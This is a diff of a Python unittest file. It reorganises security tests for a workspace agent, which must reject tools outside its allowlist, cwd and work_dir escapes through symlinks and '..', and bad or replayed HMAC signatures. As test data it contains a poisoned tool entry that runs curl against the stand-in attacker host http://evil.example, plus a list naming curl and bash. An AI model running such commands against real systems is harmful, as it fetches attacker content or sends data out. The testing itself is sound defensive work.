@@ -23,7 +23,6 @@ from pathlib import Path
 LAB = Path(__file__).resolve().parents[1]
 AGENT_PATH = LAB / "workspace" / "workspace_agent.py"
 
-UNKNOWN_BINS = ("curl", "bash", "sh", "/usr/bin/curl", "/bin/bash", "./curl")
 PWN_MARK = "wsexec-must-not-exec"
 
 
@@ -182,125 +181,35 @@ class WsexecSignedErrorTests(unittest.TestCase):
         self.assertTrue(body.get("ok"), body)
         self._assert_signed(body)
 
-    def test_wsexec_unknown_bin_path_escape_bad_hmac_is_signed_error_not_a_shell(self):
-        """Unknown bin, path escape, and invalid HMAC are signed errors; nothing execs."""
-        self.assertIn("echo", self.agent.ALLOWED_BINS)
-        for banned in ("curl", "bash", "sh"):
-            self.assertNotIn(banned, self.agent.ALLOWED_BINS)
-
+    def test_handle_request_unknown_bin_is_signed_error_not_a_shell(self):
+        """Poisoned TOOLS_BY_JOB curl writes a signed error and does not exec."""
         self._provision_ok()
         self.seen_cmds.clear()
-
-        # --- unknown bin: fleet-wsexec name-only against a poisoned map ---
-        for argv0 in UNKNOWN_BINS:
-            with self.subTest(case="unknown-bin-wsexec", argv0=argv0):
-                self.seen_cmds.clear()
-                self.agent.TOOLS_BY_JOB[self.job_id] = {
-                    "evil": {"argv": [argv0, "http://evil.example", PWN_MARK], "description": ""}
-                }
-                req_id = f"wsexec-unknown-bin-{Path(argv0).name}-{argv0.count('/')}"
-                self.agent.handle_request(
-                    {
-                        "job_id": self.job_id,
-                        "action": "tool",
-                        "req_id": req_id,
-                        "tool": "evil",
-                        "cwd": str(self.work_dir),
-                    }
-                )
-                body = self._read_result(req_id)
-                self._assert_signed_error(body, "allowlisted")
-                self.assertIn(Path(argv0).name.lower(), (body.get("error") or "").lower())
-                self._assert_never_ran(argv0, "curl", "bash", "sh")
-                self._assert_never_ran_shell()
-                self._assert_never_ran_pwn()
-
-        # --- unknown bin: signed provision must not register or exec it ---
-        for i, argv0 in enumerate(("curl", "bash", "/usr/bin/curl")):
-            with self.subTest(case="unknown-bin-provision", argv0=argv0):
-                self.seen_cmds.clear()
-                job = f"job-prov-bin-{i}-{Path(argv0).name}"
-                wd = self.jobs / job / "repo"
-                req_id = f"prov-unknown-bin-{i}-{Path(argv0).name}"
-                self.agent.handle_request(
-                    self.sign(
-                        {
-                            "job_id": job,
-                            "action": "provision",
-                            "req_id": req_id,
-                            "repo_url": str(self.src),
-                            "git_ref": "main",
-                            "work_dir": str(wd),
-                            "commands": [],
-                            "smoke_commands": [],
-                            "env": {},
-                            "tools": {
-                                "evil": {
-                                    "argv": [argv0, "http://evil.example", PWN_MARK],
-                                    "description": "",
-                                }
-                            },
-                        }
-                    )
-                )
-                body = self._read_result(req_id)
-                self._assert_signed_error(body, "allowlisted")
-                self.assertIn(Path(argv0).name.lower(), (body.get("error") or "").lower())
-                self._assert_never_ran(argv0)
-                self.assertIsNone(
-                    self.agent.TOOLS_BY_JOB.get(job),
-                    "unknown bin must not land in TOOLS_BY_JOB",
-                )
-                joined = " ".join(" ".join(str(x) for x in cmd) for cmd in self.seen_cmds)
-                self.assertNotIn(PWN_MARK, joined, f"unknown bin reached exec: {self.seen_cmds!r}")
-
-        # restore a valid map for later cases
         self.agent.TOOLS_BY_JOB[self.job_id] = {
-            "say": {"argv": ["echo", "wsexec-ok"], "description": ""}
+            "evil": {"argv": ["curl", "http://evil.example", PWN_MARK], "description": ""}
         }
-        self.seen_cmds.clear()
+        self.agent.handle_request(
+            {
+                "job_id": self.job_id,
+                "action": "tool",
+                "req_id": "wsexec-unknown-bin",
+                "tool": "evil",
+                "cwd": str(self.work_dir),
+            }
+        )
+        body = self._read_result("wsexec-unknown-bin")
+        self._assert_signed_error(body, "allowlisted")
+        self.assertIn("curl", (body.get("error") or "").lower())
+        self._assert_never_ran("curl", "bash", "sh")
+        self._assert_never_ran_shell()
+        self._assert_never_ran_pwn()
 
-        # --- path escape: cwd outside jobs root (wsexec cwd) ---
+    def test_handle_request_path_escape_is_signed_error(self):
+        """cwd that is a symlink out of jobs writes a signed error and does not exec."""
+        self._provision_ok()
+        self.seen_cmds.clear()
         outside = self.tmp / "outside-jobs"
         outside.mkdir()
-        (outside / f"{PWN_MARK}.txt").write_text("planted\n", encoding="utf-8")
-        self.agent.handle_request(
-            {
-                "job_id": self.job_id,
-                "action": "tool",
-                "req_id": "wsexec-cwd-outside",
-                "tool": "say",
-                "cwd": str(outside),
-            }
-        )
-        body = self._read_result("wsexec-cwd-outside")
-        self._assert_signed_error(body, "outside")
-        self._assert_never_ran_shell()
-        echo_after_escape = [c for c in self.seen_cmds if c and Path(str(c[0])).name == "echo"]
-        self.assertEqual(echo_after_escape, [], f"escaped cwd must not exec: {self.seen_cmds!r}")
-
-        # --- path escape: logical .. walk out of jobs to a real directory ---
-        self.seen_cmds.clear()
-        escape = self.work_dir / ".." / ".." / ".." / "outside-jobs"
-        self.assertTrue(escape.resolve() == outside.resolve(), escape)
-        self.assertTrue(escape.is_dir(), escape)
-        self.assertFalse(self.agent.path_under_jobs(escape))
-        self.agent.handle_request(
-            {
-                "job_id": self.job_id,
-                "action": "tool",
-                "req_id": "wsexec-cwd-dotdot",
-                "tool": "say",
-                "cwd": str(escape),
-            }
-        )
-        body = self._read_result("wsexec-cwd-dotdot")
-        self._assert_signed_error(body, "outside")
-        echo_after_dotdot = [c for c in self.seen_cmds if c and Path(str(c[0])).name == "echo"]
-        self.assertEqual(echo_after_dotdot, [], f".. cwd must not exec: {self.seen_cmds!r}")
-
-        # --- path escape: symlink whose resolve() leaves jobs ---
-        self.seen_cmds.clear()
         link = self.jobs / self.job_id / "escape-link"
         link.symlink_to(outside)
         self.agent.handle_request(
@@ -317,18 +226,86 @@ class WsexecSignedErrorTests(unittest.TestCase):
         echo_after_link = [c for c in self.seen_cmds if c and Path(str(c[0])).name == "echo"]
         self.assertEqual(echo_after_link, [], f"symlink cwd must not exec: {self.seen_cmds!r}")
 
-        # --- path escape: provision work_dir outside jobs ---
+    def test_handle_request_bad_hmac_is_signed_error_not_a_clone(self):
+        """Wrong-key provision HMAC writes a signed error and does not git clone."""
+        wd = self.jobs / "job-hmac-wrong" / "repo"
+        req = self.sign(
+            {
+                "job_id": "job-hmac-wrong",
+                "action": "provision",
+                "req_id": "hmac-wrong",
+                "repo_url": str(self.src),
+                "git_ref": "main",
+                "work_dir": str(wd),
+                "commands": [f"echo {PWN_MARK}"],
+                "smoke_commands": [],
+                "env": {},
+                "tools": {},
+            },
+            secret="wrong-handshake-secret",
+        )
+        self.agent.handle_request(req)
+        body = self._read_result("hmac-wrong")
+        self._assert_signed_error(body, "hmac")
+        self.assertFalse(wd.exists(), "wrong hmac must not create work_dir")
+        git_clones = [c for c in self.seen_cmds if c and Path(str(c[0])).name == "git"]
+        self.assertEqual(git_clones, [], f"wrong hmac must not exec git: {self.seen_cmds!r}")
+        self._assert_never_ran_shell()
+
+    def test_handle_request_replayed_hmac_is_signed_error_not_a_clone(self):
+        """Second handle_request of the same signed provision is a signed replay error."""
+        job = "job-hmac-replay"
+        wd = self.jobs / job / "repo"
+        req = self.sign(
+            {
+                "job_id": job,
+                "action": "provision",
+                "req_id": "hmac-replay-once",
+                "repo_url": str(self.src),
+                "git_ref": "main",
+                "work_dir": str(wd),
+                "commands": [],
+                "smoke_commands": [],
+                "env": {},
+                "tools": {},
+            }
+        )
+        self.agent.handle_request(req)
+        first = self._read_result("hmac-replay-once")
+        self.assertTrue(first.get("ok"), first)
+        self.assertTrue(wd.is_dir(), wd)
+        marker = wd / "no-second-clone"
+        marker.write_text("keep\n", encoding="utf-8")
+        (self.fleet / "result-hmac-replay-once.json").unlink()
         self.seen_cmds.clear()
-        escaped_wd = self.tmp / "escaped-work"
+        self.agent.handle_request(req)
+        body = self._read_result("hmac-replay-once")
+        self._assert_signed_error(body, "hmac", "replay")
+        git_clones = [
+            c
+            for c in self.seen_cmds
+            if c and Path(str(c[0])).name == "git" and "clone" in c
+        ]
+        self.assertEqual(git_clones, [], f"replay must not clone: {self.seen_cmds!r}")
+        self.assertTrue(marker.is_file(), "replay must not re-clone (git_clone rmtree dest)")
+
+    def test_handle_request_provision_work_dir_symlink_escape_is_signed_error(self):
+        """provision work_dir that is a symlink out of jobs is a signed error, not a clone."""
+        outside = self.tmp / "escaped-outside"
+        outside.mkdir()
+        link = self.jobs / "job-escape-wd-link" / "repo"
+        link.parent.mkdir(parents=True)
+        link.symlink_to(outside)
+        self.seen_cmds.clear()
         self.agent.handle_request(
             self.sign(
                 {
-                    "job_id": "job-escape-wd",
+                    "job_id": "job-escape-wd-link",
                     "action": "provision",
-                    "req_id": "prov-wd-escape",
+                    "req_id": "prov-wd-symlink",
                     "repo_url": str(self.src),
                     "git_ref": "main",
-                    "work_dir": str(escaped_wd),
+                    "work_dir": str(link),
                     "commands": [f"echo {PWN_MARK}"],
                     "smoke_commands": [],
                     "env": {},
@@ -336,127 +313,17 @@ class WsexecSignedErrorTests(unittest.TestCase):
                 }
             )
         )
-        body = self._read_result("prov-wd-escape")
+        body = self._read_result("prov-wd-symlink")
         self._assert_signed_error(body, "outside")
-        self.assertFalse(escaped_wd.exists(), "escaped work_dir must not be created")
         git_clones = [
             c
             for c in self.seen_cmds
             if c and Path(str(c[0])).name == "git" and "clone" in c
         ]
-        self.assertEqual(git_clones, [], f"escaped work_dir must not clone: {self.seen_cmds!r}")
+        self.assertEqual(git_clones, [], f"symlink work_dir must not clone: {self.seen_cmds!r}")
+        self.assertTrue(link.is_symlink(), "escaped work_dir symlink must be left in place")
+        self.assertFalse((outside / "README").exists(), "clone must not land outside jobs")
         self._assert_never_ran_shell()
-
-        # --- bad HMAC: wrong key / truncated / missing must not exec ---
-        hmac_cases = []
-        missing = {
-            "job_id": "job-hmac-missing",
-            "action": "provision",
-            "req_id": "hmac-missing",
-            "repo_url": str(self.src),
-            "git_ref": "main",
-            "work_dir": str(self.jobs / "job-hmac-missing" / "repo"),
-            "commands": [f"echo {PWN_MARK}"],
-            "smoke_commands": [],
-            "env": {},
-            "tools": {},
-        }
-        hmac_cases.append(("missing", missing, self.jobs / "job-hmac-missing" / "repo"))
-
-        wrong = self.sign(
-            {
-                "job_id": "job-hmac-wrong",
-                "action": "provision",
-                "req_id": "hmac-wrong",
-                "repo_url": str(self.src),
-                "git_ref": "main",
-                "work_dir": str(self.jobs / "job-hmac-wrong" / "repo"),
-                "commands": [f"echo {PWN_MARK}"],
-                "smoke_commands": [],
-                "env": {},
-                "tools": {},
-            },
-            secret="wrong-handshake-secret",
-        )
-        hmac_cases.append(("wrong-key", wrong, self.jobs / "job-hmac-wrong" / "repo"))
-
-        trunc = self.sign(
-            {
-                "job_id": "job-hmac-trunc",
-                "action": "provision",
-                "req_id": "hmac-trunc",
-                "repo_url": str(self.src),
-                "git_ref": "main",
-                "work_dir": str(self.jobs / "job-hmac-trunc" / "repo"),
-                "commands": [f"echo {PWN_MARK}"],
-                "smoke_commands": [],
-                "env": {},
-                "tools": {},
-            }
-        )
-        trunc["hmac"] = trunc["hmac"][:16]
-        hmac_cases.append(("truncated", trunc, self.jobs / "job-hmac-trunc" / "repo"))
-
-        for label, req, wd in hmac_cases:
-            with self.subTest(case="bad-hmac-provision", label=label):
-                self.seen_cmds.clear()
-                self.agent.handle_request(req)
-                body = self._read_result(req["req_id"])
-                self._assert_signed_error(body, "hmac")
-                self.assertFalse(wd.exists(), f"{label} hmac must not create work_dir")
-                git_clones = [
-                    c
-                    for c in self.seen_cmds
-                    if c and Path(str(c[0])).name == "git"
-                ]
-                self.assertEqual(
-                    git_clones,
-                    [],
-                    f"{label} hmac must not exec git: {self.seen_cmds!r}",
-                )
-                self._assert_never_ran_shell()
-                self._assert_never_ran("curl", "bash", "sh")
-
-        # bad HMAC on a tool request that would otherwise exec
-        self.seen_cmds.clear()
-        bad_tool = self.sign(
-            {
-                "job_id": self.job_id,
-                "action": "tool",
-                "req_id": "hmac-bad-tool",
-                "tool": "say",
-                "cwd": str(self.work_dir),
-            },
-            secret="wrong-handshake-secret",
-        )
-        self.agent.handle_request(bad_tool)
-        body = self._read_result("hmac-bad-tool")
-        self._assert_signed_error(body, "hmac")
-        echo_after_bad_mac = [c for c in self.seen_cmds if c and Path(str(c[0])).name == "echo"]
-        self.assertEqual(
-            echo_after_bad_mac,
-            [],
-            f"invalid HMAC must not exec the tool: {self.seen_cmds!r}",
-        )
-        self._assert_never_ran_shell()
-
-        # --- control: name-only wsexec of an allowlisted bin still runs ---
-        self.seen_cmds.clear()
-        self.agent.handle_request(
-            {
-                "job_id": self.job_id,
-                "action": "tool",
-                "req_id": "wsexec-control-ok",
-                "tool": "say",
-                "cwd": str(self.work_dir),
-            }
-        )
-        ok = self._read_result("wsexec-control-ok")
-        self.assertTrue(ok.get("ok"), ok)
-        self._assert_signed(ok)
-        self.assertEqual(ok.get("argv"), ["echo", "wsexec-ok"])
-        self.assertIn("wsexec-ok", ok.get("stdout") or "")
-        self.assertIn(["echo", "wsexec-ok"], self.seen_cmds)
 
 
 if __name__ == "__main__":
